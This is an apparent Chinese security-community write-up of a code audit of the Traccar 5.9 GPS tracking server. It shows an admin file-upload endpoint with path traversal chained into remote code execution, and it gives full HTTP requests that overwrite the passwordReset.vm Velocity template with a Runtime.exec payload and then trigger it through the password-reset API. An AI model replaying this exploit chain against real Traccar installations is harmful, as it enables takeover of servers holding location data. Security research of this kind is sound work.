

# traccar 代码审记小结 - 先知社区

traccar 代码审记小结

- - -

## 1\. 描述&环境搭建

Traccar 是一个开源的 GPS 跟踪系统，可以从[https://github.com/traccar/traccar/releases/download/v5.9/traccar-windows-64-5.9.zip](https://github.com/traccar/traccar/releases/download/v5.9/traccar-windows-64-5.9.zip) ，下载最新版本的安装包

默认安装后从 windows 服务启动 traccar（有一说一很不明白为什么放到服务里了不整个自启动）

访问[http://127.0.0.1:8082，](http://127.0.0.1:8082，)  
开始创建账号（根据官方文档，第一个创建的账号即为管理员账户）

## 2.代码审计

先检查下 build.gradle 里有没有什么有趣的依赖

```plain
//...
    implementation "com.mysql:mysql-connector-j:8.1.0"
    //...
    implementation "org.glassfish.jersey.containers:jersey-container-servlet:$jerseyVersion"
    implementation "org.glassfish.jersey.media:jersey-media-json-jackson:$jerseyVersion"
    implementation "org.glassfish.jersey.inject:jersey-hk2:$jerseyVersion"
    //...
    implementation "org.apache.velocity:velocity-engine-core:2.3"
    implementation "org.apache.velocity.tools:velocity-tools-generic:3.1"
    implementation "org.apache.commons:commons-collections4:4.4"
    //...
```

嗯，很好，mysql 依赖的版本很高，不能指望 jdbc 转 RCE 了，但是意外的看到了 velocity，一会可以留意下有没有 SSTI 的问题。

顺便提一嘴，glassfish 可以理解为 tomcat 的完整 javaee 实现版本，所以基本还是 filter 做鉴权，servlet 做路由那套。

接着看看鉴权部分是怎么做的  
src\\main\\java\\org\\traccar\\web\\WebServer.java

```plain
private void initApi(ServletContextHandler servletHandler) {
        String mediaPath = config.getString(Keys.MEDIA_PATH);
        if (mediaPath != null) {
            ServletHolder servletHolder = new ServletHolder(DefaultServlet.class);
            servletHolder.setInitParameter("resourceBase", new File(mediaPath).getAbsolutePath());
            servletHolder.setInitParameter("dirAllowed", "false");
            servletHolder.setInitParameter("pathInfoOnly", "true");
            servletHandler.addServlet(servletHolder, "/api/media/*");
        }

        ResourceConfig resourceConfig = new ResourceConfig();
        resourceConfig.registerClasses(
                JacksonFeature.class,
                ObjectMapperContextResolver.class,
                DateParameterConverterProvider.class,
                SecurityRequestFilter.class,
                CorsResponseFilter.class,
                ResourceErrorHandler.class);
        resourceConfig.packages(ServerResource.class.getPackage().getName());
        if (resourceConfig.getClasses().stream().filter(ServerResource.class::equals).findAny().isEmpty()) {
            LOGGER.warn("Failed to load API resources");
        }
        servletHandler.addServlet(new ServletHolder(new ServletContainer(resourceConfig)), "/api/*");
    }
```

然后我就发现这段代码看的一头雾水，是时候祭出 chatgpt 了，重点部分如下

```plain
在这个配置中，注册了一些类，包括 JacksonFeature、ObjectMapperContextResolver、DateParameterConverterProvider、SecurityRequestFilter、CorsResponseFilter 和 ResourceErrorHandler。这些类通常用于处理和管理 Web API 请求和响应。

最后，将配置好的 resourceConfig 添加到 servletHandler 中，映射到 "/api/*" 路径，这意味着该 Servlet 将处理以 "/api/" 开头的所有 HTTP 请求。

总之，这段代码是用于初始化一个 Servlet 上下文处理器，配置处理媒体文件的 Servlet 以及配置和注册用于处理 RESTful Web 服务请求的 Jersey 组件和资源类。
```

好，既然知道 filter 是哪几个了，那就看看鉴权都写的啥。

当翻到 SecurityRequestFilter 的时候，我突然释然的笑了，也就是说除了被 PermitAll 修饰的方法全都得过鉴权，经过一番 ctrl+shift+f，被我们寄予厚望的不需要授权的接口宣布 GG，呕吼，还是看看远方的授权有没有什么漏洞吧。

```plain
@Override
    public void filter(ContainerRequestContext requestContext) {

        //...
        SecurityContext securityContext = null;

        try {

            String authHeader = requestContext.getHeaderString("Authorization");
            if (authHeader != null) {

                try {
                    User user;
                    if (authHeader.startsWith("Bearer ")) {
                        user = loginService.login(authHeader.substring(7));
                    } else {
                        String[] auth = decodeBasicAuth(authHeader);
                        user = loginService.login(auth[0], auth[1]);
                    }
                    if (user != null) {
                        statisticsManager.registerRequest(user.getId());
                        securityContext = new UserSecurityContext(new UserPrincipal(user.getId()));
                    }
                } catch (StorageException | GeneralSecurityException | IOException e) {
                    throw new WebApplicationException(e);
                }

            } else if (request.getSession() != null) {

                Long userId = (Long) request.getSession().getAttribute(SessionResource.USER_ID_KEY);
                if (userId != null) {
                    User user = injector.getInstance(PermissionsService.class).getUser(userId);
                    if (user != null) {
                        user.checkDisabled();
                        statisticsManager.registerRequest(userId);
                        securityContext = new UserSecurityContext(new UserPrincipal(userId));
                    }
                }

            }

        } catch (SecurityException | StorageException e) {
            LOGGER.warn("Authentication error", e);
        }

        if (securityContext != null) {
            requestContext.setSecurityContext(securityContext);
        } else {
            Method method = resourceInfo.getResourceMethod();
            if (!method.isAnnotationPresent(PermitAll.class)) {
                Response.ResponseBuilder responseBuilder = Response.status(Response.Status.UNAUTHORIZED);
                String accept = request.getHeader("Accept");
                if (accept != null && accept.contains("text/html")) {
                    responseBuilder.header("WWW-Authenticate", "Basic realm=\"api\"");
                }
                throw new WebApplicationException(responseBuilder.build());
            }
        }

    }
```

### 2.1 后台任意文件上传一转 RCE

经过一番翻找，发现一个 uploadImage 竟然没有做文件名的校验，直接将传入的 path 拼接进 output，任意文件上传到手

```plain
@Path("file/{path}")
    @POST
    @Consumes("*/*")
    public Response uploadImage(@PathParam("path") String path, File inputFile) throws IOException, StorageException {
        permissionsService.checkAdmin(getUserId());
        String root = config.getString(Keys.WEB_OVERRIDE, config.getString(Keys.WEB_PATH));

        var outputPath = Paths.get(root, path);
        var directoryPath = outputPath.getParent();
        if (directoryPath != null) {
            Files.createDirectories(directoryPath);
        }

        try (var input = new FileInputStream(inputFile); var output = new FileOutputStream(outputPath.toFile())) {
            input.transferTo(output);
        }
        return Response.ok().build();
    }
```

但是这个环境虽然是类似 tomcat，但它很 spring，因为这玩意也是经典打包成 jar 包运行。

那么 windows+jar 包的格式怎么让任意文件上传变成 RCE 呢，经过我一番思索（指摇了个师傅救场）后，恍然发现前面不还有个模板引擎吗？正好这个项目的模板还是放在 Jar 包外面，这覆盖完不就 RCE 了吗。

一番寻找后锁定了`.\templates\full\passwordReset.vm`作为我的目标

掏出我珍藏的 velocity payload，将如下请求的 cookie 修改为有效 cookie 后发送，检查会发现 passwordReset.vm 被成功覆盖

```plain
POST /api/server/file/..%2ftemplates%2ffull%2fpasswordReset.vm HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: image/jpeg
Content-Length: 376
Connection: close
Cookie: JSESSIONID=Vaild_Cookie

#set($subject = "Password reset")
<!DOCTYPE html>
<html>
<body>
To reset password please click on the following link:<br>
<a href="$webUrl/reset-password?passwordReset=$token">$webUrl/reset-password?passwordReset=$token</a><br>
</body>
</html>


#set ($exp = "exp");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("cmd.exe /c echo aaa > pwn.txt");
```

接着将如下请求的 cookie 修改为有效 cookie，将 email 修改为创建账号的 email 后发送

```plain
POST /api/password/reset HTTP/1.1
Host: 192.168.109.155:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.109.155:8082/settings/preferences
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 18
Origin: http://192.168.109.155:8082
Connection: close
Cookie: JSESSIONID=Vaild_Cookie

email=YOUR_Login_Email
```

检查安装目录（windows 默认安装在 C:\\Program Files\\Traccar 下），成功生成 pwn.txt

## 3.总结

新人的练手作品，如果哪里有问题还希望各位师傅多多指点，SALUTE！
